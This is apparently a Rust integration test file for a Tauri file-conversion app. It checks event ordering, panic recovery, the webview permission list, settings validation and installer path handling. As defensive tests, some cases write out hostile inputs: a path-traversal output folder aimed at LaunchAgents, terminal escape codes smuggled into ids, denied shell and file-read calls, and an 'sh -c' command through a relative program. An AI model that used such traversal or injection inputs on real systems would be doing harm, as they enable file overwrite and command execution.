        std::thread::sleep(std::time::Duration::from_millis(10));
    }
    assert!(saw_finish.load(Ordering::SeqCst), "the batch never reported that it had finished");
    assert!(
        free_on_finish.load(Ordering::SeqCst),
        "the batch slot was still claimed when `batch_finished` was emitted: an adopted batch would \
         never clear, and clicking Convert on that event would be refused"
    );
    let _ = std::fs::remove_dir_all(&dir);
}

/// Load-bearing ordering, half two: `install.rs` frees the install slot **before** it emits
/// `Finished`. Swap those two statements and this test fails.
///
/// Same two dependants as the batch, one file over: the settings page re-enables Install on that
/// event, and a webview reloaded mid-install confirms what it adopted by reading `get_activity` after
/// it - so a slot still held here leaves every Install button dead for the session.
///
/// The installer used is one that cannot start (an absolute path to nothing), because what is being
/// pinned is the order of the last two statements, not what a package manager does: no process is
/// spawned, and `finished` still arrives exactly once.
#[test]
fn the_install_slot_is_free_at_the_instant_finished_is_emitted() {
    use std::sync::atomic::{AtomicBool, Ordering};
    use std::sync::Arc;

    let webview = test_app();
    let app = webview.app_handle().clone();

    let free_on_finish = Arc::new(AtomicBool::new(false));
    let saw_finish = Arc::new(AtomicBool::new(false));
    let probe_free = free_on_finish.clone();
    let probe_saw = saw_finish.clone();
    let probed = app.clone();
    app.listen(crate::INSTALL_EVENT, move |event| {
        if let Ok(value) = serde_json::from_str::<Value>(event.payload()) {
            if value["type"] == json!("finished") {
                probe_free.store(!probed.state::<AppState>().is_installing(), Ordering::SeqCst);
                probe_saw.store(true, Ordering::SeqCst);
            }
        }
    });

    let command = convert_core::install::InstallCommand {
        package: &convert_core::package::PANDOC,
        program: std::path::PathBuf::from("/definitely/not/here/brew"),
        args: vec!["install", "pandoc"],
        env: vec![],
        needs_admin: false,
        display: "brew install pandoc".into(),
    };
    let id = app.state::<AppState>().begin_install().expect("slot");
    crate::install::run_with(app.clone(), command, id, || |_| false);

    assert!(saw_finish.load(Ordering::SeqCst), "an install always ends with one finished event");
    assert!(
        free_on_finish.load(Ordering::SeqCst),
        "the install slot was still claimed when `finished` was emitted: a reloaded window would \
         adopt an install that had already ended and never re-enable Install"
    );
    assert!(!app.state::<AppState>().is_installing());
}

/// The one path that emits no terminal event of its own: a panic unwinding out of the worker.
///
/// `run_batch` handles a *worker thread* that dies (it reports the row and still ends with
/// `batch_finished`), but nothing inside it survives a panic on its own thread - a refused
/// `thread::spawn`, or a sink that blows up. The slot guard was the only thing left running, and it
/// freed the slot silently: the app accepted new work while the window sat in `running` forever,
/// because `batch_finished` is the only event that settles rows and ends the run (`handleEvent` in
/// `src/state/store.ts`). Now the guard closes the batch out, with the tally the window was actually
/// given rather than an invented one.
#[test]
fn a_batch_killed_by_a_panic_still_tells_the_window_it_is_over() {
    use crate::commands::{Reported, SlotGuard};
    use std::sync::atomic::{AtomicBool, Ordering};
    use std::sync::{Arc, Mutex};

    let webview = test_app();
    let app = webview.app_handle().clone();

    let tally: Arc<Mutex<Option<Value>>> = Arc::new(Mutex::new(None));
    let free_when_told = Arc::new(AtomicBool::new(false));
    let seen = tally.clone();
    let was_free = free_when_told.clone();
    let probed = app.clone();
    app.listen(crate::BATCH_EVENT, move |event| {
        if let Ok(value) = serde_json::from_str::<Value>(event.payload()) {
            if value["type"] == json!("batch_finished") {
                was_free.store(!probed.state::<AppState>().is_running(), Ordering::SeqCst);
                *seen.lock().expect("lock") = Some(value);
            }
        }
    });

    let slot = app.state::<AppState>().begin_batch().expect("slot");
    // Three items: one converted and one refused before the crash, one that never ran.
    let reported = Arc::new(Reported::default());
    reported.record(&convert_core::BatchEvent::Finished {
        id: "a".into(),
        outputs: vec![],
        bytes: 0,
        elapsed_ms: 0,
    });
    reported.record(&convert_core::BatchEvent::Failed { id: "b".into(), message: "no".into() });

    let hook = std::panic::take_hook();
    std::panic::set_hook(Box::new(|_| {})); // the crash is the point; do not print it
    let died = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        let _guard =
            SlotGuard { app: app.clone(), batch_id: slot.id, total: 3, reported: reported.clone() };
        panic!("the batch thread blew up");
    }));
    std::panic::set_hook(hook);
    assert!(died.is_err(), "the panic must not be swallowed");

    let told = tally.lock().expect("lock").clone().expect(
        "a batch that crashed emitted no `batch_finished`: the window keeps a spinner running over \
         work that has stopped, for the rest of the session",
    );
    assert_eq!(told["ok"], json!(1), "{told}");
    assert_eq!(told["failed"], json!(1), "{told}");
    assert_eq!(told["skipped"], json!(1), "the item that never ran is accounted for: {told}");
    assert!(
        free_when_told.load(Ordering::SeqCst),
        "the slot must be free before the window is told the batch is over, crash or not"
    );
    assert!(!app.state::<AppState>().is_running());

    // And the guard stays quiet when the batch ended properly: exactly one `batch_finished` per run.
    *tally.lock().expect("lock") = None;
    let slot = app.state::<AppState>().begin_batch().expect("slot");
    let reported = Arc::new(Reported::default());
    reported.record(&convert_core::BatchEvent::BatchFinished { ok: 2, failed: 0, skipped: 0 });
    drop(SlotGuard { app: app.clone(), batch_id: slot.id, total: 2, reported });
    assert!(
        tally.lock().expect("lock").is_none(),
        "a batch that already said it was finished must not be closed out twice"
    );
}

/// Same hole on the install side: `finished` is the settings page's only way out of "Installing…".
#[test]
fn an_install_killed_by_a_panic_still_tells_the_window_it_is_over() {
    use std::sync::atomic::{AtomicBool, Ordering};
    use std::sync::{Arc, Mutex};

    let webview = test_app();
    let app = webview.app_handle().clone();

    let ending: Arc<Mutex<Option<Value>>> = Arc::new(Mutex::new(None));
    let free_when_told = Arc::new(AtomicBool::new(false));
    let seen = ending.clone();
    let was_free = free_when_told.clone();
    let probed = app.clone();
    app.listen(crate::INSTALL_EVENT, move |event| {
        if let Ok(value) = serde_json::from_str::<Value>(event.payload()) {
            if value["type"] == json!("finished") {
                was_free.store(!probed.state::<AppState>().is_installing(), Ordering::SeqCst);
                *seen.lock().expect("lock") = Some(value);
            }
        }
    });

    let command = convert_core::install::InstallCommand {
        package: &convert_core::package::PANDOC,
        program: std::path::PathBuf::from("/definitely/not/here/brew"),
        args: vec!["install", "pandoc"],
        env: vec![],
        needs_admin: false,
        display: "brew install pandoc".into(),
    };
    let id = app.state::<AppState>().begin_install().expect("slot");

    let hook = std::panic::take_hook();
    std::panic::set_hook(Box::new(|_| {}));
    // The probe factory stands in for anything that can panic after the install started.
    let died = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        crate::install::run_with(app.clone(), command, id, || -> fn(convert_core::Tool) -> bool {
            panic!("discovery blew up")
        });
    }));
    std::panic::set_hook(hook);
    assert!(died.is_err(), "the panic must not be swallowed");

    let told = ending.lock().expect("lock").clone().expect(
        "an install that crashed emitted no `finished`: the Install button stays disabled and the \
         row spins for the rest of the session",
    );
    assert_eq!(told["ok"], json!(false), "nothing was verified, so nothing is claimed: {told}");
    assert_eq!(told["package_id"], json!(convert_core::package::PANDOC.id), "{told}");
    assert!(
        free_when_told.load(Ordering::SeqCst),
        "the slot must be free before the window is told the install is over, crash or not"
    );
    assert!(!app.state::<AppState>().is_installing());
}

/// A real batch, end to end: fake FFmpeg, real queue, real `batch://event` stream.
///
/// This is the test that pins the event contract the frontend listens to - the name, the
/// `type`-tagged payload shape, and the guarantee that `batch_finished` is always last.
#[test]
fn a_batch_streams_events_and_frees_the_slot_when_it_ends() {
    let webview = test_app();
    let app = webview.app_handle().clone();

    let dir = std::env::temp_dir().join(format!("cc-ipc-batch-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).expect("mkdir");
    let input = dir.join("clip.mov");
    std::fs::write(&input, b"x").expect("write");

    // Stand-in for the sidecar: writes whatever it is asked to write, instantly.
    let ffmpeg = dir.join("ffmpeg");
    std::fs::write(
        &ffmpeg,
        "#!/bin/sh\necho 'out_time_us=1000000'\necho 'progress=end'\nout=\"\"\nfor a in \"$@\"; do out=\"$a\"; done\nprintf 'ok' > \"$out\"\n",
    )
    .expect("write fake ffmpeg");
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&ffmpeg, std::fs::Permissions::from_mode(0o755)).expect("chmod");
    }

    {
        let state = app.state::<AppState>();
        let mut registry = convert_core::ToolRegistry::default();
        registry.set(convert_core::Tool::Ffmpeg, ffmpeg);
        *state.engine.write().expect("engine lock") =
            std::sync::Arc::new(convert_core::Engine::new(registry));
    }

    let events: std::sync::Arc<std::sync::Mutex<Vec<Value>>> = Default::default();
    let sink = events.clone();
    // Sampled at the instant `batch_finished` is delivered, not afterwards: the UI re-enables its
    // Convert button on that event, so the slot must already be free *then*. Sampling later would
    // let a "release after the event" regression slip through unnoticed.
    let slot_free_on_finish = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false));
    let slot_probe = slot_free_on_finish.clone();
    let probed = app.clone();
    app.listen(crate::BATCH_EVENT, move |event| {
        if let Ok(value) = serde_json::from_str::<Value>(event.payload()) {
            if value["type"] == json!("batch_finished") {
                slot_probe.store(
                    !probed.state::<AppState>().is_running(),
                    std::sync::atomic::Ordering::SeqCst,
                );
            }
            sink.lock().expect("event lock").push(value);
        }
    });

    let settings = invoke(&webview, "get_settings", json!({})).expect("get_settings");
    invoke(
        &webview,
        "start_batch",
        json!({
            "items": [{ "id": "row-1", "path": input.to_string_lossy(), "target_id": "mp4" }],
            "settings": settings,
        }),
    )
    .expect("start_batch");

    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(20);
    loop {
        let done =
            events.lock().expect("event lock").iter().any(|e| e["type"] == json!("batch_finished"));
        if done || std::time::Instant::now() > deadline {
            break;
        }
        std::thread::sleep(std::time::Duration::from_millis(20));
    }

    let events = events.lock().expect("event lock").clone();
    let kinds: Vec<&str> = events.iter().filter_map(|e| e["type"].as_str()).collect();
    assert!(kinds.contains(&"started"), "{events:#?}");
    assert!(kinds.contains(&"finished"), "{events:#?}");
    assert_eq!(kinds.last(), Some(&"batch_finished"), "{events:#?}");

    let started = events.iter().find(|e| e["type"] == json!("started")).expect("started");
    assert_eq!(started["id"], json!("row-1"), "every event echoes the FileInfo id");
    let finished = events.iter().find(|e| e["type"] == json!("batch_finished")).expect("summary");
    assert_eq!(finished["ok"], json!(1));
    assert!(dir.join("Converted/clip.mp4").exists(), "the converted file must be on disk");

    // The worker thread must have released the single-batch guard - and it must have done so
    // before the UI was told the batch was over.
    assert!(
        slot_free_on_finish.load(std::sync::atomic::Ordering::SeqCst),
        "the batch slot was still claimed when batch_finished reached the UI: clicking Convert \
         right after a batch would be refused"
    );
    let state = app.state::<AppState>();
    assert!(state.begin_batch().is_ok(), "the batch slot is stuck");
    let _ = std::fs::remove_dir_all(&dir);
}

/// The capability file is the app's security boundary, and it is data - nothing but a test notices
/// when an entry is added "just to make something work", or when a whole default *set* is inherited
/// for the sake of two commands inside it. Both directions are pinned: what the UI genuinely needs
/// must be allowed, and everything Tauri's `core:default` used to hand over must now be denied.
#[test]
fn the_webview_may_listen_for_events_but_not_reach_past_what_it_was_granted() {
    let webview = test_app();

    // What the UI does: subscribe to the three event streams (and the webview's own drag & drop),
    // drag the window by its custom title bar, and zoom it by double-clicking that bar.
    for event in [crate::BATCH_EVENT, crate::INSTALL_EVENT, crate::menu::MENU_EVENT] {
        assert!(
            invoke(
                &webview,
                "plugin:event|listen",
                json!({ "event": event, "target": { "kind": "Any" }, "handler": 0 }),
            )
            .is_ok(),
            "the UI cannot receive `{event}` events"
        );
    }
    for (cmd, args) in [
        ("plugin:event|unlisten", json!({ "event": "batch://event", "eventId": 0 })),
        ("plugin:window|start_dragging", json!({ "label": "main" })),
        ("plugin:window|internal_toggle_maximize", json!({ "label": "main" })),
    ] {
        assert!(invoke(&webview, cmd, args).is_ok(), "the UI needs `{cmd}`");
    }

    // What it must not reach. Every one of these was granted by `core:default` and used by nothing:
    // a webview that could build a menu can replace this app's own menu bar (`set_as_app_menu`),
    // one that can read an image from a path can exfiltrate any picture on the disk, and `path`
    // hands over the user's home directory for free. `emit` is denied too: the UI only listens, and
    // a page that can emit can forge this app's own `batch://event` and `install://event` streams.
    for (cmd, args) in [
        ("plugin:menu|new", json!({ "kind": "Submenu", "handler": 0 })),
        ("plugin:menu|set_as_app_menu", json!({ "rid": 1 })),
        ("plugin:image|from_path", json!({ "path": "/etc/hosts" })),
        ("plugin:path|resolve_directory", json!({ "directory": 2 })),
        ("plugin:app|version", json!({})),
        ("plugin:app|identifier", json!({})),
        ("plugin:webview|internal_toggle_devtools", json!({ "label": "main" })),
        ("plugin:resources|close", json!({ "rid": 1 })),
        ("plugin:event|emit", json!({ "event": "batch://event", "payload": null })),
        // Not in what we asked for either way: closing the window is the app's decision, and a
        // webview that could reach the shell plugin would be able to run anything at all.
        ("plugin:window|close", json!({ "label": "main" })),
        ("plugin:shell|execute", json!({ "program": "brew", "args": ["-v"] })),
    ] {
        let err = invoke(&webview, cmd, args)
            .expect_err(&format!("`{cmd}` is reachable from the webview"));
        let text = err.as_str().unwrap_or_default();
        assert!(text.contains("not allowed"), "`{cmd}` failed for the wrong reason: {text}");
    }
}

/// The menu bar is the app's only route to Settings, Open and Convert, and it is built at runtime
/// rather than declared in config - so nothing but a test stops an id from being renamed on one
/// side of the wire only. Test the definitions used by the builder without creating AppKit
/// objects on Rust's worker threads (Tauri's mock does not dispatch to the macOS main thread).
#[test]
fn the_menu_bar_exposes_every_action_the_frontend_handles() {
    use crate::menu::{action, ACTION_ITEMS};
    let ids: Vec<&str> = ACTION_ITEMS.iter().map(|item| item.0).collect();
    assert_eq!(ids.len(), ids.iter().collect::<std::collections::HashSet<_>>().len());
    assert!(ACTION_ITEMS
        .iter()
        .all(|(_, label, key)| !label.is_empty() && key.starts_with("CmdOrCtrl+")));

    for expected in [
        action::SETTINGS,
        action::SKIN,
        action::OPEN_FILES,
        action::OPEN_FOLDER,
        action::PASTE_LINKS,
        action::CONVERT,
        action::STOP,
        action::CLEAR,
    ] {
        assert!(ids.contains(&expected), "`{expected}` is missing from {ids:?}");
    }
}

/// Everything `tauri.conf.json` promises to ship has to be on disk. A renamed icon or a `resources`
/// glob that matches nothing does not fail a build: it produces an `.app` with a blank Dock icon and
/// no bundled licences (which FFmpeg's LGPL obliges us to include), discovered after release. Config
/// is data, so only a test reads it before `tauri build` does.
#[test]
fn every_file_the_bundle_config_names_exists() {
    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR"));
    let conf: Value = serde_json::from_str(
        &std::fs::read_to_string(root.join("tauri.conf.json")).expect("tauri.conf.json"),
    )
    .expect("tauri.conf.json must be valid JSON");

    let icons = conf["bundle"]["icon"].as_array().expect("bundle.icon");
    assert!(!icons.is_empty(), "an app with no icon gets a blank one");
    for icon in icons {
        let rel = icon.as_str().expect("icon entries are strings");
        assert!(root.join(rel).is_file(), "bundle.icon names a file that does not exist: {rel}");
    }

    for resource in conf["bundle"]["resources"].as_array().expect("bundle.resources") {
        let rel = resource.as_str().expect("resource entries are strings");
        let dir = root.join(rel.trim_end_matches("/*"));
        let matched = std::fs::read_dir(&dir).map(|entries| entries.count()).unwrap_or(0);
        assert!(matched > 0, "bundle.resources matches nothing: {rel}");
    }

    // `externalBin` names the sidecars without their target-triple suffix; on disk they carry it.
    // Same pairing `build.rs` enforces, checked from the config end.
    for bin in conf["bundle"]["externalBin"].as_array().expect("bundle.externalBin") {
        let rel = bin.as_str().expect("externalBin entries are strings");
        let suffixed = format!("{rel}-{}", crate::sidecar::TARGET_TRIPLE);
        assert!(
            root.join(&suffixed).exists(),
            "externalBin `{rel}` has no binary for this target: {suffixed}"
        );
    }

    // The capability file the ACL test pins is the one this config loads.
    let csp = conf["app"]["security"]["csp"].as_str().unwrap_or_default();
    assert!(csp.contains("default-src 'self'"), "the webview must not load remote code");
    assert!(root.join("capabilities/default.json").is_file());
}

/// The webview owns the whole `Settings` payload, and `output` is the part of it that picks a
/// filesystem *destination*: `subfolder_name: "../../.."` plus `on_conflict: "overwrite"` writes
/// converted bytes over any file the user can write - a launch agent, another app's data - with no
/// dialog anywhere. Every command that could write through it, or promise that it will, refuses.
#[test]
fn a_crafted_output_location_is_refused_by_every_command_that_writes_through_it() {
    let webview = test_app();

    let settings = invoke(&webview, "get_settings", json!({})).expect("get_settings");
    let mut crafted = settings.clone();
    crafted["output"]["location"] = json!("subfolder");
    crafted["output"]["subfolder_name"] = json!("../../../../Library/LaunchAgents");
    crafted["output"]["on_conflict"] = json!("overwrite");

    assert!(
        invoke(&webview, "save_settings", json!({ "settings": crafted })).is_err(),
        "a climbing destination must not even be persisted"
    );
    assert!(
        invoke(
            &webview,
            "estimate_output_path",
            json!({ "path": "/tmp/clip.mov", "target_id": "mp4", "settings": crafted }),
        )
        .is_err(),
        "the preview must be refused on the same terms as the batch"
    );
    assert!(
        invoke(
            &webview,
            "start_batch",
            json!({
                "items": [{ "id": "row-1", "path": "/tmp/clip.mov", "target_id": "mp4" }],
                "settings": crafted,
            }),
        )
        .is_err(),
        "the batch itself must be refused"
    );
    // ...and no refusal may latch the single-batch guard, or nothing would ever convert again.
    assert!(!webview.state::<AppState>().is_running(), "a refusal claimed the batch slot");

    // An absolute custom folder that does not exist is refused too - it would otherwise be created
    // wherever the payload pointed.
    let mut invented = settings.clone();
    invented["output"]["location"] = json!("custom");
    invented["output"]["custom_dir"] = json!("/definitely/not/here");
    assert!(invoke(&webview, "save_settings", json!({ "settings": invented })).is_err());

    // The *destination* survived all of it untouched. (Validation is per field, so a preference
    // that merely travelled in the same payload - the conflict policy, a codec - is saved on its own
    // merits; the place files land in is the boundary, and it is repaired rather than obeyed. See
    // `a_codec_edit_survives_a_destination_the_user_has_not_finished_choosing`.)
    let after = invoke(&webview, "get_settings", json!({})).expect("get_settings");
    assert_eq!(after["output"]["subfolder_name"], json!("Converted"));
    assert_eq!(after["output"]["location"], json!("subfolder"));
    assert!(after["output"]["custom_dir"].is_null());

    // A crafted id that *is* refused must not come back out as something a terminal or a log
    // renderer would act on.
    for (cmd, args) in [
        ("apply_preset", json!({ "preset_id": "web\u{1b}]0;pwned\u{7}" })),
        (
            "estimate_output_path",
            json!({ "path": "/tmp/x.mov", "target_id": "m\u{1b}[31mp4\n\n", "settings": settings }),
        ),
    ] {
        let err = invoke(&webview, cmd, args).expect_err("a crafted id is refused");
        let text = err.as_str().unwrap_or_default();
        assert!(!text.chars().any(|c| c.is_control()), "{cmd}: {text:?}");
        assert!(text.len() < 400, "{cmd}: {text:?}");
    }
}

/// A webview reload throws away every listener and the whole UI store - but not the batch. The
/// window came back believing it was idle, dropped the events of a conversion it no longer knew
/// about, and had its next Convert refused with "a conversion is already running" and no way to see
/// or stop the one that was. `get_activity` is the truth a fresh page can ask for.
#[test]
fn a_reloaded_webview_can_ask_what_the_shell_is_still_doing() {
    let webview = test_app();
    let state = webview.state::<AppState>();

    let idle = invoke(&webview, "get_activity", json!({})).expect("get_activity");
    assert_eq!(idle["converting"], json!(false), "{idle}");
    assert_eq!(idle["installing"], json!(false), "{idle}");

    let batch = state.begin_batch().expect("a batch may start");
    let install = state.begin_install().expect("an install may start");
    let busy = invoke(&webview, "get_activity", json!({})).expect("get_activity");
    assert_eq!(busy["converting"], json!(true), "a reloaded page must still see the batch: {busy}");
    assert_eq!(busy["installing"], json!(true), "{busy}");

    // Cancelling is reachable without any of the state the reload destroyed.
    assert!(invoke(&webview, "cancel_batch", json!({})).is_ok());
    assert!(batch.cancel.load(std::sync::atomic::Ordering::SeqCst), "Stop must reach this batch");

    state.end_batch(batch.id);
    state.end_install(install);
    let done = invoke(&webview, "get_activity", json!({})).expect("get_activity");
    assert_eq!(done["converting"], json!(false), "{done}");
    assert_eq!(done["installing"], json!(false), "{done}");
}

/// One panic while a lock was held used to end the session: every later `get_settings`,
/// `save_settings`, `refresh_tools` and - through the engine - every `start_batch` answered
/// "internal error: the ... lock was poisoned; restart the app". The values behind these locks are
/// replaced wholesale, never mutated in halves, so recovering is safe and refusing is the bug.
#[test]
fn a_panic_that_poisoned_a_lock_does_not_end_the_session() {
    let webview = test_app();
    let app = webview.app_handle().clone();

    // Silence the deliberate panics below; every other test in this binary expects none.
    let hook = std::panic::take_hook();
    std::panic::set_hook(Box::new(|_| {}));
    for poison in [0, 1] {
        let handle = app.clone();
        let died = std::thread::spawn(move || {
            let state = handle.state::<AppState>();
            if poison == 0 {
                let _held = state.settings.lock().expect("settings lock");
                panic!("a command panicked holding the settings lock");
            } else {
                let _held = state.engine.write().expect("engine lock");
                panic!("a command panicked holding the engine lock");
            }
        })
        .join();
        assert!(died.is_err(), "the helper thread was supposed to panic");
    }
    std::panic::set_hook(hook);

    // Everything the UI needs still answers.
    let settings = invoke(&webview, "get_settings", json!({})).expect("get_settings after a panic");
    assert!(invoke(&webview, "save_settings", json!({ "settings": settings })).is_ok());
    assert!(invoke(&webview, "get_catalog", json!({})).is_ok());
    assert!(invoke(&webview, "refresh_tools", json!({})).is_ok());
    assert!(invoke(&webview, "cancel_batch", json!({})).is_ok());
    assert!(invoke(&webview, "get_activity", json!({})).is_ok());
}

/// Two saves at once used to share one temp file (`settings.json.<pid>.tmp`): each truncated the
/// other's half-written bytes and whichever renamed first published whatever was there, so the next
/// launch read a torn file as "no settings at all". The cache could also end up disagreeing with the
/// file, reverting a change the window was still showing.
#[test]
fn concurrent_saves_leave_one_valid_settings_file_that_matches_the_cache() {
    let webview = test_app();
    let app = webview.app_handle().clone();

    let mut writers = Vec::new();
    for worker in 0..8u8 {
        let app = app.clone();
        writers.push(std::thread::spawn(move || {
            for round in 0..25u8 {
                let mut settings = convert_core::Settings::default();
                settings.image.quality = 1 + (worker * 25 + round) % 100;
                let state = app.state::<AppState>();
                state.store_settings(&app, settings).expect("save");
            }
        }));
    }
    for writer in writers {
        writer.join().expect("a saving thread panicked");
    }

    let file = crate::settings_store::path(&app).expect("settings path");
    let raw = std::fs::read_to_string(&file).expect("the settings file must exist");
    let on_disk: convert_core::Settings = serde_json::from_str(&raw)
        .unwrap_or_else(|e| panic!("the settings file is torn: {e}\n{raw}"));
    assert_eq!(
        on_disk,
        app.state::<AppState>().settings(&app),
        "the file and the in-memory copy disagree: one of the two saves was lost"
    );

    // No half-written temp file may be left lying around either.
    let dir = file.parent().expect("config dir");
    let strays: Vec<String> = std::fs::read_dir(dir)
        .expect("read config dir")
        .flatten()
        .map(|e| e.file_name().to_string_lossy().to_string())
        .filter(|name| name.ends_with(".tmp"))
        .collect();
    assert!(strays.is_empty(), "{strays:?}");
}

/// The installer's program is meant to be an absolute path probed on disk. The resolver's last
/// fallback walks `PATH`, and a `PATH` with a relative entry (`.`, or the empty element a trailing
/// `:` leaves) yields a relative program that `Command` resolves against *this app's* working
/// directory - i.e. runs whatever is sitting there. Nothing is spawned in that case.
#[test]
fn the_installer_never_runs_a_package_manager_from_a_relative_path() {
    let webview = test_app();
    let app = webview.app_handle().clone();

    let dir = std::env::temp_dir().join(format!("cc-ipc-relative-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).expect("mkdir");
    let marker = dir.join("it-ran");
    // `args` is `&'static str` by design, which is the point: this leak is the test paying the
    // price of pretending to be the allowlist.
    let touch: &'static str =
        Box::leak(format!("printf x > {}", marker.to_string_lossy()).into_boxed_str());

    let events: std::sync::Arc<std::sync::Mutex<Vec<Value>>> = Default::default();
    let sink = events.clone();
    app.listen(crate::INSTALL_EVENT, move |event| {
        if let Ok(value) = serde_json::from_str::<Value>(event.payload()) {
            sink.lock().expect("event lock").push(value);
        }
    });

    let command = convert_core::install::InstallCommand {
        package: &convert_core::package::PANDOC,
        // Relative on purpose: `sh` would be found on `PATH` and would run the argv below.
        program: std::path::PathBuf::from("sh"),
        args: vec!["-c", touch],
        env: vec![],
        needs_admin: false,
        display: "brew install pandoc".into(),
    };

    let id = app.state::<AppState>().begin_install().expect("slot");
    crate::install::run_with(app.clone(), command, id, || |_| false);

    assert!(!marker.exists(), "a relative program was executed");
    let collected = events.lock().expect("event lock").clone();
    let finished = collected.last().expect("an install always ends with one finished event");
    assert_eq!(finished["type"], json!("finished"));
    assert_eq!(finished["ok"], json!(false), "{collected:#?}");
    let message = finished["message"].as_str().unwrap_or_default();
    assert!(message.contains("Could not start the installer"), "{message}");
    assert!(message.contains("brew install pandoc"), "{message}");
    assert!(!app.state::<AppState>().is_installing(), "the install slot is stuck");
    let _ = std::fs::remove_dir_all(&dir);
}
